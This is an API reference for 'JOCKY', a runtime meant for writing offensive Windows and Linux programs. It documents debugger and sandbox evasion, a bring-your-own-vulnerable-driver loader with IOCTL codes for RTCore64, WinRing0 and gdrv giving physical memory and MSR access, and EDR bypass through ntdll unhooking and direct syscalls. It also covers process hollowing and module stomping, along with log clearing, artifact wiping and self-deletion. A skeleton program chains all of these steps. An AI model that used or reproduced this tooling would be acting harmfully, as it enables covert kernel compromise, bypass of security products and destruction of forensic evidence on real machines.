# JOCKY Runtime API Reference

Every function below is compiled into the final binary (unless `--no-runtime`
is passed to `jockyc`) and is callable from JOCKY source via `ffi`.

All `ffi` declarations shown here go at the top of your `.jky` file.

---

## 1  Initialization

### `jocky_runtime_init() -> i32`

**Call this first.**  Runs the full startup sequence:
1. Integrity check – aborts (`ExitProcess(0xDEAD1337)`) if the binary was
   patched after `addAntiTamper` ran during the build.
2. Debugger / VM / sandbox detection.

Returns a bitmask of detected threats (0 = clean environment).

```
ffi jocky_runtime_init() -> i32;

fn main() -> void {
    let threats: i32 = jocky_runtime_init();
    if threats != 0 {
        return;   // hostile environment – bail out
    }
    // ...
}
```

---

## 2  Anti-Analysis

### `jocky_check_analysis_environment() -> i32`

Runs all checks and returns a bitmask:

| Bit | Constant value | Meaning |
|-----|---------------|---------|
| 0   | `1`           | Debugger present |
| 1   | `2`           | Running inside a VM |
| 2   | `4`           | Sandbox detected |

```
ffi jocky_check_analysis_environment() -> i32;
```

### Individual checks  →  `bool`

```
ffi jocky_is_debugger_present()       -> bool;  // IsDebuggerPresent + CheckRemoteDebugger
ffi jocky_is_remote_debugger()        -> bool;  // CheckRemoteDebuggerPresent / TracerPid
ffi jocky_check_hardware_breakpoints()-> bool;  // DR0–DR3 registers (Windows only)
ffi jocky_is_vm()                     -> bool;  // CPUID hypervisor bit
ffi jocky_is_sandbox()                -> bool;  // timing + known sandbox DLLs/usernames
ffi jocky_check_timing_rdtsc()        -> bool;  // RDTSC delta over 50 ms sleep
ffi jocky_check_timing_api()          -> bool;  // GetTickCount delta over 500 ms sleep
```

Returns `true` when the condition is detected.

### `jocky_verify_integrity() -> bool`  *(Windows only)*

Reads the running binary from disk, recomputes the XOR-folded CRC32 of all
PE sections, and compares it against the `.jtamp` section embedded during the
build.  Calls `ExitProcess(0xDEAD1337)` on mismatch.  Returns `true` if the
check passed or if `.jtamp` is absent (unpacked build).

Called automatically by `jocky_runtime_init()`; you rarely need to call it
directly.

```
ffi jocky_verify_integrity() -> bool;
```

---

## 3  BYOVD Loader  *(Windows, requires Administrator)*

Loads the driver embedded in the `.jdrv` PE section by `jockyc --embed-driver`.

### Layout of the `jocky_byovd_t` struct in memory

The struct is 584 bytes total.  Allocate it as an `i8` array and pass a
pointer.  Do not interpret the fields directly from JOCKY – use the helpers.

```
// allocate 584 bytes on the stack (MAX_PATH*2 + 64 + 8 for HANDLE/padding)
// safest: use a global or heap buffer
ffi jocky_byovd_load(i8*, i8*, i8*)  -> bool;
ffi jocky_byovd_unload(i8*)          -> void;
```

### `jocky_byovd_load(service_name, device_name, out_ctx) -> bool`

| Parameter | Type | Meaning |
|-----------|------|---------|
| `service_name` | `i8*` / `string` | SCM service name to register (pass `0` to auto-generate `jky_<rand>`) |
| `device_name`  | `i8*` / `string` | NT device symlink, e.g. `"MyDriver"` → opens `\\.\MyDriver` (pass `0` to use service name) |
| `out_ctx`      | `i8*`            | Pointer to a 584-byte zero-initialised buffer |

Returns `true` on success.  The device handle is stored inside `out_ctx`; use
it with `DeviceIoControl` (via another `ffi`).

**What it does internally:**
1. Finds `.jdrv` section in the in-memory PE image.
2. RC4-decrypts the driver bytes using the per-build key stored in the section.
3. Drops the `.sys` to `%TEMP%\<rand8>.sys`.
4. Calls `CreateService(SERVICE_KERNEL_DRIVER)` then `StartService`.
5. Opens `\\.\<device_name>` and stores the `HANDLE` in `out_ctx`.

### `jocky_byovd_unload(ctx)`

Stops the service, calls `DeleteService`, and deletes the dropped `.sys`.
Always call this before exiting to avoid leaving artifacts.

**Example:**

```
ffi jocky_byovd_load(i8*, i8*, i8*) -> bool;
ffi jocky_byovd_unload(i8*)         -> void;

fn load_driver() -> void {
    // 584-byte buffer – in real code use a global or alloca equivalent
    let ctx: i8* = 0;   // TODO: allocate 584 bytes

    let ok: bool = jocky_byovd_load("MyVulnDrv", "MyVulnDrv", ctx);
    if !ok { return; }

    // ... send IOCTLs via DeviceIoControl ffi ...

    jocky_byovd_unload(ctx);
}
```

> **Note:** `jocky_byovd_load` returns `true` even if the device handle is
> `INVALID_HANDLE_VALUE`.  Some drivers do not create a device symlink; in
> that case resolve the device path manually and open it with a `CreateFile`
> FFI call.

---

## 4  Driver Interaction  *(Windows only, requires `jocky_byovd_load` to have run)*

Two complementary systems work together.  The high-level primitives
(`jocky_driver_read_phys` etc.) first check the built-in **static profile
table** for known vulnerable drivers; if the driver is not recognised they
fall back to the embedded **.jmani manifest**.

### Built-in static profiles

| Driver service name | `read_phys` | `write_phys` | `read_msr` | `write_msr` | `map_phys` |
|---------------------|:-----------:|:------------:|:----------:|:-----------:|:----------:|
| `RTCore64`          | ✓           | ✓            | –          | –           | –          |
| `WinRing0`          | ✓           | ✓            | ✓          | ✓           | –          |
| `WinRing0x64`       | ✓           | ✓            | ✓          | ✓           | –          |
| `gdrv`              | ✓ (via map) | –            | –          | –           | ✓          |

### `jocky_driver_read_phys(ctx, phys_addr, out, size) -> bool`

Read `size` bytes of physical memory into `out`.

```
ffi jocky_driver_read_phys(i8*, i64, i8*, i32) -> bool;
```

### `jocky_driver_write_phys(ctx, phys_addr, in, size) -> bool`

Write `size` bytes from `in` to physical address `phys_addr`.

```
ffi jocky_driver_write_phys(i8*, i64, i8*, i32) -> bool;
```

### `jocky_driver_read_msr(ctx, msr_id, out) -> bool`

Read a 64-bit model-specific register.  `out` is a pointer to a `uint64_t`.

```
ffi jocky_driver_read_msr(i8*, i32, i8*) -> bool;
```

### `jocky_driver_write_msr(ctx, msr_id, val) -> bool`

Write a 64-bit value to a model-specific register.

```
ffi jocky_driver_write_msr(i8*, i32, i64) -> bool;
```

### `jocky_driver_map_phys(ctx, phys_addr, size, out_va) -> bool`

Map a physical range and return the kernel virtual address in `*out_va`.
Currently supported by **gdrv only**.

```
ffi jocky_driver_map_phys(i8*, i64, i32, i8*) -> bool;
```

### `jocky_manifest_load() -> bool`

Parse the `.jmani` section embedded by `jockyc --manifest`.  Called
automatically by `jocky_runtime_init()`; only call manually if you skip
`jocky_runtime_init()`.  Returns `false` (not an error) if no `.jmani`
section exists.

```
ffi jocky_manifest_load() -> bool;
```

### `jocky_driver_invoke(ctx, primitive, in_buf, in_size, out_buf, out_size) -> bool`

Dispatch an arbitrary IOCTL by name from the `.jmani` manifest.

| Parameter  | Type    | Meaning |
|------------|---------|---------|
| `ctx`      | `i8*`   | byovd context from `jocky_byovd_load` |
| `primitive`| `i8*`   | name exactly as written in the manifest file |
| `in_buf`   | `i8*`   | input buffer (`0` if none) |
| `in_size`  | `i32`   | input byte count |
| `out_buf`  | `i8*`   | output buffer (`0` if none) |
| `out_size` | `i32`   | output buffer capacity |

```
ffi jocky_driver_invoke(i8*, i8*, i8*, i32, i8*, i32) -> bool;
```

### Manifest file format  (`--manifest <file>`)

One entry per line.  Comment lines start with `#`.

```
# name          ioctl       in_bytes  out_bytes
read_phys       0x9C402584  8         4
write_phys      0x9C402588  12        0
read_msr        0x9C40258C  4         8
write_msr       0x9C402590  12        0
```

The file is encoded by `jockyc --manifest` into a compact binary `.jmani`
section.  The runtime parses it on startup inside `jocky_manifest_load()`.

### Example – RTCore64 read 8 bytes at physical 0xFFFFF000

```
ffi jocky_byovd_load(i8*, i8*, i8*)  -> bool;
ffi jocky_driver_read_phys(i8*, i64, i8*, i32) -> bool;
ffi jocky_byovd_unload(i8*)          -> void;

fn main() -> void {
    let ctx: i8* = 0;   // allocate 584 bytes

    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
    if !ok { return; }

    let buf: i8* = 0;   // allocate 8 bytes
    let read_ok: bool = jocky_driver_read_phys(ctx, 0xFFFFF000, buf, 8);

    jocky_byovd_unload(ctx);
}
```

### Example – unknown driver via manifest (`--manifest mydrv.txt`)

```
ffi jocky_byovd_load(i8*, i8*, i8*)              -> bool;
ffi jocky_driver_invoke(i8*, i8*, i8*, i32, i8*, i32) -> bool;

fn main() -> void {
    let ctx: i8* = 0;   // 584 bytes

    let ok: bool = jocky_byovd_load("MyVulnDrv", "MyVulnDrv", ctx);
    if !ok { return; }

    let req: i8* = 0;   // 8 bytes  (size|phys_addr)
    let out: i8* = 0;   // 4 bytes
    jocky_driver_invoke(ctx, "read_phys", req, 8, out, 4);
}
```

---

## 5  Evasion  *(Windows only)*

### `jocky_unhook_ntdll() -> bool`

Reloads a clean copy of `ntdll.dll` from `System32`, finds its `.text`
section, and overwrites the in-memory `.text` of the currently-mapped ntdll.
Removes user-mode inline hooks placed by EDR/AV products.

Call before any sensitive ntdll-routed syscall.

```
ffi jocky_unhook_ntdll() -> bool;
```

### `jocky_get_syscall_number(zw_name) -> i32`

Reads the syscall number directly from the ntdll stub bytes (Hell's Gate /
Halo's Gate).  Works through most EDR hooks.

```
ffi jocky_get_syscall_number(i8*) -> i32;

let ssn: i32 = jocky_get_syscall_number("NtAllocateVirtualMemory");
```

### `jocky_direct_syscall(syscall_number, ...) -> i64`

Executes a syscall instruction directly with the given number.  Arguments are
passed in the standard Windows x64 calling convention after `syscall_number`.

```
ffi jocky_direct_syscall(i32, ...) -> i64;
```

---

## 6  Execution  *(Windows only)*

### `jocky_process_hollow(target_path, payload, payload_size) -> bool`

Creates `target_path` suspended, unmaps its image, maps `payload` at the
original base, fixes the entry point, and resumes the thread.

```
ffi jocky_process_hollow(i8*, i8*, i64) -> bool;
```

| Parameter | Meaning |
|-----------|---------|
| `target_path`   | Wide-char path to the host process (e.g. `svchost.exe`) – cast `i8*` to `wchar_t*` in the FFI |
| `payload`       | In-memory PE image to inject |
| `payload_size`  | Size of payload in bytes |

### `jocky_module_stomp(pid, module_name, payload, payload_size) -> bool`

Overwrites a loaded DLL in a remote process with `payload`.

```
ffi jocky_module_stomp(i32, i8*, i8*, i64) -> bool;
```

---

## 7  Cleanup

### `jocky_self_delete() -> bool`

**Windows:** renames the binary to a temp file then schedules deletion via
`MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT)`.

**Linux:** unlinks `/proc/self/exe`.

```
ffi jocky_self_delete() -> bool;
```

### `jocky_clear_logs() -> bool`

**Windows:** runs `wevtutil cl` on Application, Security, System, Setup, and
ForwardedEvents logs.

**Linux:** rotates and vacuums the systemd journal; truncates `wtmp`/`lastlog`.

```
ffi jocky_clear_logs() -> bool;
```

### `jocky_wipe_artifacts() -> bool`

**Windows:** deletes Prefetch (`C:\Windows\Prefetch\*`), Recent files, and
contents of `%TEMP%`.

**Linux:** clears bash history and `/tmp/.jocky*`.

```
ffi jocky_wipe_artifacts() -> bool;
```

---

## 8  Crypto Helpers

### `jocky_decrypt_xor(data, len, key)`

In-place XOR decrypt with a rotating key (`key = (key << 1) | (key >> 7)`
after each byte).

```
ffi jocky_decrypt_xor(i8*, i64, i8) -> void;
```

### `jocky_decrypt_rc4(data, len, key, key_len)`

In-place RC4 stream decrypt.  `key` is a byte array of `key_len` bytes.

```
ffi jocky_decrypt_rc4(i8*, i64, i8*, i64) -> void;
```

---

## 9  Typical program skeleton

```
ffi jocky_runtime_init()     -> i32;
ffi jocky_unhook_ntdll()     -> bool;
ffi jocky_byovd_load(i8*, i8*, i8*) -> bool;
ffi jocky_byovd_unload(i8*)  -> void;
ffi jocky_self_delete()      -> bool;
ffi jocky_clear_logs()       -> bool;

fn main() -> void {
    // 1. Integrity + environment check
    let threats: i32 = jocky_runtime_init();
    if threats != 0 { return; }

    // 2. Strip EDR hooks
    jocky_unhook_ntdll();

    // 3. Load embedded driver
    let ctx: i8* = 0;   // allocate 584 bytes
    let ok: bool = jocky_byovd_load(0, "VulnDrv", ctx);
    if !ok { return; }

    // 4. ... exploit the driver via DeviceIoControl ...

    // 5. Cleanup
    jocky_byovd_unload(ctx);
    jocky_clear_logs();
    jocky_self_delete();
}
```

---

## Build flags that affect the runtime

| Flag | Effect |
|------|--------|
| *(none)* | Runtime compiled and linked in; `jocky_runtime_init()` auto-called from generated entry |
| `--no-runtime` | Runtime skipped entirely; none of the above functions exist |
| `--embed-driver <path>` | Driver embedded as `.jdrv` section; `jocky_byovd_load` can find it |
| `--manifest <path>` | IOCTL manifest embedded as `.jmani` section; `jocky_driver_invoke` uses it |
| `--pack` | PE sections RC4-encrypted (Windows) or UPX-packed (Linux) |
| *(always, Windows)* | `.jtamp` anti-tamper section added; verified at startup |
